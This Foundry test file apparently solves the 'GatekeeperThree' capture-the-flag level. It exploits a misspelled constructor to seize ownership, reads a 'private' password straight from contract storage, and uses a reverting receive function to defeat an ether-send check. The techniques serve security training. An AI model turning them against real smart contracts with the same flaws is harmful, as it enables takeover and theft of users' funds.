// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/level28.sol";

contract Level28Test is Test {
    GatekeeperThree public target;
    address public player = address(this);

    function setUp() public {
        vm.deal(player, 1 ether);
        // vm.startPrank(player);
        target = new GatekeeperThree();
    }

    function testAttack() public {
        Attacker attacker = new Attacker(target);
        vm.deal(address(attacker), 1 ether);

        // Step 1: Become owner via construct0r()
        attacker.becomeOwner();

        // Step 2: Create trick contract via GatekeeperThree
        attacker.createTrick();

        // Step 3: Init trick, read password, call getAllowance correctly
        attacker.getAllowanceCorrectly();

        // Step 4: Send exact ETH to target
        attacker.fundTarget();

        // Step 5: Call enter() from attacker (owner), with tx.origin != owner
        attacker.enterGate();
        // target.enter();

        // Validate
        assertEq(target.entrant(), tx.origin);
    }
}

contract Attacker is Test {
    GatekeeperThree public target;
    uint256 public password;

    constructor(GatekeeperThree _target) {
        target = _target;
    }

    function becomeOwner() public {
        target.construct0r(); // msg.sender becomes owner
    }

    function createTrick() public {
        target.createTrick();
        target.trick().trickInit();
    }

    function getAllowanceCorrectly() public {
        bytes32 slot = vm.load(address(target.trick()), bytes32(uint256(2)));
        password = uint256(slot);
        // must call from trick's context
        vm.prank(address(target.trick()));
        target.getAllowance(password);
    }

    function fundTarget() public {
        payable(address(target)).transfer(0.0313331 ether);
    }

    function enterGate() public {
        target.enter();
    }

    // To fail gateThree’s ether send
    receive() external payable {
        revert("fail ether receive");
    }

    fallback() external payable {
        revert("fail fallback");
    }
}
